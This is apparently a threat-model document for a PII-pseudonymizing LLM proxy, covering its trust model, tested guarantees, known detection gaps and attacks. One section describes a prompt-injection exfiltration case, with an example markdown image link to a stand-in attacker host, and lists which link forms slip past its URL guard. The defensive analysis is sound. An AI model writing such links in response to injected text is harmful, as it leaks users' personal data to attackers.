# Threat model

pseudonymbench replaces PII in chat-completions requests with random tokens
before they leave your network, and puts the original values back into the
response. This page says what that does and does not protect, which parts are
checked by tests, and what is out of reach. It is a design document, not a
compliance statement. The tool does **pseudonymization, not anonymization**.

## Trust model

- The proxy is **fully trusted**. It terminates the client connection, sees
  every prompt in plaintext, sees the `Authorization` header, and holds the key
  that decrypts the vault. Run it inside the boundary you already trust with
  the data, and put TLS in front of it (it does not terminate TLS itself).
- The **upstream LLM API** is the party the tool protects the data from. It
  receives prompts with tokens in place of detected PII.
- The **client application** is trusted with the restored values. It already
  had them.
- **Redis** (when used) is semi-trusted: it holds only AES-256-GCM ciphertext
  and keyed hashes, so reading it does not reveal values without the master key.

## What is claimed, and what checks it

| Claim | Where it is checked |
|---|---|
| A detected value never reaches the upstream in any scanned field | `internal/eval` field matrix: a canary planted in each of 20 request fields; a no-proxy control must leak all 20 |
| A request the proxy cannot scan is rejected, not forwarded | `internal/proxy` `TestFailsClosed`: bad JSON, non-object, wrong content type, gzip body, oversize body, blocked kind, unknown path, wrong method; upstream call count must be 0 |
| A vault failure never sends the request unmasked | `TestVaultFailureFailsClosed` |
| Tokens from one session restore nothing in another | `internal/vault` `TestSessionsAreIsolated`; `internal/proxy` `TestSessionContinuityAndIsolation` (a different credential with the same session header cannot read the token) |
| Guessing a session name is not enough to read its tokens | Session ids are `HMAC(key, sha256(Authorization) \|\| session header)` (`proxy.sessionID`); tested as above |
| Redis holds no plaintext values | `TestRedisStoresNoPlaintext`; values are sealed with AES-256-GCM, bound to session and token as additional data (`TestSealer`) |
| The audit log holds counts and timings, never values | `TestAuditLogHasCountsNotValues` greps the log for each planted value, the bearer token and the session name |
| A token the model puts inside a URL is not restored | `internal/mask` `TestRestoreURLGuard`, `internal/stream` `TestURLGuardAcrossChunks` (every split position), `internal/proxy` `TestTokenInURLIsNotRestored` |
| A token split across stream chunks is restored, and held text is never lost | `internal/stream` split-position tests, random chunking, fuzz target, flush-on-finish/`[DONE]`/error/EOF tests |

"Never" above means: for the detector rules and request fields listed. It does
not mean the detectors find every piece of PII. They do not; see the next section.

## What it misses

Each row says what slips through and how much we know about it. "Measured"
points at a number reproducible with `scripts/eval.sh` or `scripts/bench.sh`.

| # | Miss | Why | Evidence |
|---|---|---|---|
| 1 | **Names, addresses, dates of birth, account and ID numbers, free text** | The regex tier targets five formats (email, phone, SSN, card, IBAN). There is no NER. | Measured: on 3,000 Nemotron-PII test rows, 23,038 gold spans fall outside the five kinds and are untouched by design |
| 2 | **Card numbers that fail the Luhn check** | A checksum is the main defence against masking order IDs. Real card numbers pass it; numbers invented by text generators mostly do not. | Measured: only 10.8% of Nemotron-PII's card numbers pass Luhn, and card recall there is 11.3%, i.e. the detector finds the valid ones and nothing else |
| 3 | **False positives on look-alikes** | 10-digit IDs starting 2-9 look like NANP phones; about 1 in 10 random 16-digit strings with a card-like prefix pass Luhn | Measured on the synthetic set: see README table (10-digit IDs are the worst case) |
| 4 | **Card networks and phone formats outside the tables** | Issuer prefixes are a short table (Visa, Mastercard, Amex, Discover, Diners, JCB, UnionPay, Maestro); phones are NANP plus `+`-prefixed international. RuPay, Mir, Elo and national formats without `+` are not detected. | By construction; tests in `internal/detect` |
| 5 | **ITINs, SSNs written without separators and without a nearby "SSN" word** | Bare nine digits are too common to mask | By construction |
| 6 | **The model changes a token** (lowercases, translates, drops it, pastes half) | Restoration is an exact string match; there is no fuzzy matching, which would restore values the model never saw | `TestMangledTokensStayVisible`: lowercased, bracket-less, spaced and truncated tokens come back exactly as the model wrote them, never as a wrong value |
| 7 | **Token escaped as `<...` inside streamed tool arguments** | The rewriter matches literal `<`; it does not decode JSON escapes inside argument fragments | `TestMissEscapedBracketsInArguments` documents the current behaviour |
| 8 | **Stream ends mid-token at `max_tokens`** | The partial token is flushed as plain text. This is deliberate: guessing the rest would restore something the model never wrote | `TestFlushOnEOFWithoutDone`, `TestHeldTextIsFlushedBeforeFinishChunk` |
| 9 | **PII in images, audio, files** | Only text is scanned. `data:` URLs and base64 audio/file fields are skipped. An `http` image URL **is** scanned as a string. | Field matrix lists `image_url.url (http)`; media content is not inspected |
| 10 | **`messages[].name` and function names** | The API restricts them to `[a-zA-Z0-9_-]` and rejects tokens, so they are skipped | `structuralSkip` in `internal/mask` |
| 11 | **Quasi-identifiers** | Combinations of values that are not masked (ZIP, gender, birth date) can identify a person. Sweeney found 87% of the US population unique on 5-digit ZIP, gender and date of birth (1990 Census). | Cannot be measured by this tool |
| 12 | **PII the model produces that was not in the input** | Output is not scanned; only known tokens are restored | Out of scope |
| 13 | **Size and timing side channels** | Replacing text with tokens changes lengths; streamed chunk sizes still leak the shape of the reply (Weiss et al., USENIX Security 2024). The proxy does not pad. | Out of scope |
| 14 | **Anthropic Messages, OpenAI Responses and other SSE dialects** | Only OpenAI chat-completions is implemented. Other paths return 403 rather than being forwarded unscanned. | `TestFailsClosed` |
| 15 | **Compressed upstream responses** | A gzip response cannot be rewritten. The proxy asks for `identity`; if the upstream compresses anyway, tokens stay visible (no PII is exposed, but nothing is restored). | `outcome=restore_skipped_encoding` in the audit log |

## Attacks considered

### Rehydration as an exfiltration channel

If untrusted text reaches the model (a web page, an email, a document), it can
instruct the model to write every token it has seen into a link or a markdown
image: `![x](https://attacker.example/p.png?d=<EMAIL_7f3a9c21>)`. A naive
rehydrator turns that into `?d=john@acme.com` and the client's renderer then
fetches the URL, sending the real value to the attacker (OWASP LLM01 describes
the image-link version of this).

**Mitigation (partial):** a token inside a URL is left as a token. The check
works on whitespace-delimited runs: a run containing `://` is a URL, and a token
inside it is not restored. The state is O(1) and survives chunk boundaries, so a
`://` split across two stream events is still caught.

**What this does not cover.** Links without a scheme (`attacker.example/?d=...`),
HTML attributes, and any exfiltration channel that does not look like a URL. The
model could also write the token in plain text to a place the user is expected
to copy it from. `-allow-urls` turns the check off. Treat this as a speed bump,
not a wall.

### Token guessing and cross-session replay

Tokens are `<KIND_` plus 32 random bits. Within a session a collision is
rejected at allocation. Across sessions, a token restores nothing: the lookup is
keyed by session id, and the session id is derived from the caller's credential
and the session header with a secret key. An attacker who guesses a token and a
session name but does not hold the same `Authorization` value reads nothing.

### Vault compromise

Reading Redis yields ciphertext and keyed hashes. Reading the proxy's memory
yields everything, including the master key; that is the trust boundary. The
in-memory vault stores values unencrypted in process memory.

Hashing a low-entropy value without a key would be reversible by enumeration
(there are about 889 million structurally valid SSNs). The value index uses
HMAC-SHA-256 with a key derived from the master key, and the tool offers no
"hash" action for that reason.

### Log leakage

The audit log is built from counts, kinds, timings and a short hash of the
session id. Request bodies, headers and values are never logged by the proxy. A
test plants canaries in the prompt, the bearer token and the session header and
checks none appear. The tool cannot control what a reverse proxy, tracing agent
or load balancer in front of it logs.

### Hostile client input

Request bodies are capped (default 8 MiB). Detector regexes are RE2 (linear
time), the card and phone scanners bound their candidate windows, and the
detectors are fuzzed for span invariants. SSE events are capped (4 MiB) so a
single huge event cannot exhaust memory. The proxy does not authenticate
clients; put it behind something that does.

## Operating it safely

1. Terminate TLS in front of the proxy and keep it on a trusted network.
2. Set `PSEUDONYMBENCH_KEY` from a secret store (`openssl rand -hex 32`). Losing
   it makes existing Redis sessions unreadable, which is the safe failure.
3. If you use Redis: give the proxy a dedicated ACL user limited to the commands
   it uses (`HGET`, `HLEN`, `HSETNX`, `HDEL`, `EXPIRE`, plus the handshake commands
   go-redis sends on connect) and the `pb:*` keys, enable TLS, and disable
   persistence (the compose file does) because tokens are disposable.
4. Leave `-allow-urls` off.
5. Pass a session header per conversation so the same value keeps the same token
   across turns; without it every request gets a fresh session and the model sees
   different tokens for the same person each turn.
6. Keep the audit log somewhere only operators can read it. It holds no values,
   but request sizes, timings and PII counts are still metadata.

## Wording to avoid

Do not describe this as production-grade, compliant, anonymizing or "safe for
PHI". It is a benchmarked research-grade proxy. Its numbers are on synthetic and
public datasets, on one machine.
